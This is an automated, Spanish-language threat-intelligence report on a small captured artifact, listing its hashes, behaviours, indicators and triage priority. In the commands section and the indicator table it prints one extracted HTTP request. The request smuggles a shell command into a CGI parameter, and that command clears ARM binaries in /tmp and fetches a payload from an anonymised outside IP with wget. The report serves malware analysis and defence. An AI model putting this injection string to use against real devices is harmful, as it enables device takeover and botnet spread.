# 🧬 Payload Analysis

`ecd9deac428f2300175f9d1d632b1da19a472b9ca932c9dfecd3327d1d618b11`

## 📌 Resumen

Artefacto de 325 B. Formato identificado como ASCII text, with CRLF line terminators. Entropía registrada: 5.11. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Comportamientos destacados: Descarga remota, Limpieza. Se identificó 1 comando observado o extraído. Se identificaron 3 indicadores técnicos.


## 🏷️ Clasificación

- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:11.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `ecd9deac428f2300175f9d1d632b1da19a472b9ca932c9dfecd3327d1d618b11`
- **SHA1:** `b3f29dd1f157e84127486085fc832b15b9e71e7e`
- **MD5:** `461ce647b81a999e0e836a759d12eba8`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 325 B |
| Entropía | 5.11 |
| Strings | 3 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Limpieza**

## 🔬 Evidencia de clasificación

- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /chkisg.htm%3FSip%3D1.1.1.XXX%20%7C%20cd%2B/tmp;rm%2Bmain_arm%2Bmain_arm7%2Barm7%2Barm;wget%2Bhttp:/\/201.51.13.XXX/mai
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 201.51.13.XXX | static_analysis |
| ip | 190.179.168.XXX | static_analysis |
| command | GET /chkisg.htm%3FSip%3D1.1.1.XXX%20%7C%20cd%2B/tmp;rm%2Bmain_arm%2Bmain_arm7%2Barm7%2Barm;wget%2Bhttp:/\/201.51.13.XXX/mai | strings |
| hash | ecd9deac428f2300175f9d1d632b1da19a472b9ca932c9dfecd3327d1d618b11 | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
